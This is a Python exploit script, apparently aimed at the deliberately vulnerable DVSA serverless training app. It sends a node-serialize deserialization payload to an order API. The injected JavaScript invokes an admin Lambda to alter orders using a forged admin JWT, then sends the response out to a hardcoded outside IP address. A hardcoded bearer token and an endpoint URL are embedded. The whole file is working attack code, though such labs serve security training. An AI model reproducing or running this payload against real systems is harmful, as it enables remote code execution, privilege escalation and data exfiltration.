import requests
#Can be used to delete orders from the server
JWT = "eyJraWQiOiJHYjNJQzQ3U2FjRTBCelNSTEM1c1JVWXF0eW9USGdwWkRrdFwvYzdXVW4wcz0iLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiI3OGZkMzRkYy0xYjNhLTRhYWMtOTcxMS02YWZkZmNmMDEyY2QiLCJldmVudF9pZCI6Ijk3NGIwNWY3LWM3N2ItNGM0Ny04NDhjLThkMTNlYTAyM2ExZSIsInRva2VuX3VzZSI6ImFjY2VzcyIsInNjb3BlIjoiYXdzLmNvZ25pdG8uc2lnbmluLnVzZXIuYWRtaW4iLCJhdXRoX3RpbWUiOjE1ODk0OTYyODYsImlzcyI6Imh0dHBzOlwvXC9jb2duaXRvLWlkcC51cy1lYXN0LTEuYW1hem9uYXdzLmNvbVwvdXMtZWFzdC0xX01ZYTZuSUFqRiIsImV4cCI6MTU4OTY1MzY5MSwiaWF0IjoxNTg5NjUwMDkxLCJqdGkiOiJkZDQwYWMzYy0xMDM3LTRlMDEtOTgwNS03NjliMThhNDlhNGQiLCJjbGllbnRfaWQiOiIzYWJoOW4yOTV0aTBycWlrM2k1M2o0aW1vcSIsInVzZXJuYW1lIjoiNzhmZDM0ZGMtMWIzYS00YWFjLTk3MTEtNmFmZGZjZjAxMmNkIn0.VQfd3hFY48VUG65o0RHf5tOlP-5nbnSHRPQgUDnQD2_IoNwOR-wRf5xk3aGGS9-eSkLP1Tt5e_j_WHOF58036rXPpASt5E_SGSAsWrzAX-e9-LhI_oR09LGL1XBLJ0UuTkr_bfDZlUzi6LDm7IIIsabdxXDZmZu-yUU_nc2pKF8Feuc9jdiMFl3G6SvmOum4WDVO8uyBDJyCzbpQgs_VZ-58x2iIScCnzX3ruQnWgrFmhmmtYYKlvmr2rdZU0rPdZG3-K4rt6W4EN2rAM6nRobqXU7j1Q-GzyMqe68GT_skrWLxeIhVsGM6Aj9bq3MVhrdBOdUrhbTMgDY9pyhhAtQ"
ENDPOINT = 'https://ni9ahapg8h.execute-api.us-east-1.amazonaws.com'

remoteServer = "http://92.222.72.208/"


payloadCookie = ".ewogICJzdWIiOiAiNzhmZDM0ZGMtMWIzYS00YWFjLTk3MTEtNmFmZGZjZjAxMmNkIiwKICAiZXZlbnRfaWQiOiAiYWExNjU4MDktNDFmYy00ZjZkLWI4MDAtYWUyNjkxODYyYTVmIiwKICAidG9rZW5fdXNlIjogImFjY2VzcyIsCiAgInNjb3BlIjogImF3cy5jb2duaXRvLnNpZ25pbi51c2VyLmFkbWluIiwKICAiYXV0aF90aW1lIjogMTU4ODk1NDcyMCwKICAiaXNzIjogImh0dHBzOi8vY29nbml0by1pZHAudXMtZWFzdC0xLmFtYXpvbmF3cy5jb20vdXMtZWFzdC0xX01ZYTZuSUFqRiIsCiAgImV4cCI6IDE1ODkzMjYyODgsCiAgImlhdCI6IDE1ODkzMjI2ODgsCiAgImp0aSI6ICIyYjJlNTJmOC03ZjMyLTQ5ZTAtODNjMi0yYzRiOTU2OTFmZDciLAogICJjbGllbnRfaWQiOiAiM2FiaDluMjk1dGkwcnFpazNpNTNqNGltb3EiLAogICJ1c2VybmFtZSI6ICI3OGZkMzRkYy0xYjNhLTRhYWMtOTcxMS02YWZkZmNmMDEyY2QiCn0=."
OrderID = "9d0f2b85-816c-410d-b052-e106b4049ded"
payload = (
    '_$$ND_FUNC$$_function(){'
        'var p=JSON.stringify({'
             '"headers":{"authorization":'
             f'"{payloadCookie}"'
             '},"body":{'
             '"action":"update",' 
             f'"order-id": "{OrderID}",'
             '"item":{"token": "NA", "ts": "1589660822",' 
             '"itemList": {"11": 1},' 
             '"address": "NA",' 
             '"total": 25,' 
             '"status": 100}'
            '}'
        '});'
        'var a=require("aws-sdk");'
        'var l=new a.Lambda();'
        'var x={FunctionName:"DVSA-ADMIN-UPDATE-ORDERS",'
        'InvocationType:"RequestResponse",'
        'Payload:p};'
        'l.invoke(x, function(e,d){'
        'var h=require("http");'
        'h.get("http://92.222.72.208"+JSON.stringify(d));'
        '});'
    '}()'
)

requests.post(f"{ENDPOINT}/dev/order", headers={
    'Accept': 'application/json',
    'Authorization': JWT
}, json={'action': payload})

